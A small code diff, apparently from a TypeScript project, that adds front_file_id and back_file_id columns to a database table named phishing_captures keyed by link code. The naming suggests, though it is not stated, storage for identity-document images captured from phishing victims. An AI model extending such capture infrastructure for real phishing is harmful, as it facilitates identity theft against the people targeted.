@@ -242,6 +242,8 @@ export async function initSchema(db: D1Database): Promise<void> {
       created_at TEXT DEFAULT (datetime('now'))
     )`,
     `CREATE INDEX IF NOT EXISTS idx_phishing_captures_code ON phishing_captures(link_code)`,
+    `ALTER TABLE phishing_captures ADD COLUMN front_file_id TEXT`,
+    `ALTER TABLE phishing_captures ADD COLUMN back_file_id TEXT`,
   ];
 
   for (const sql of stmts) {
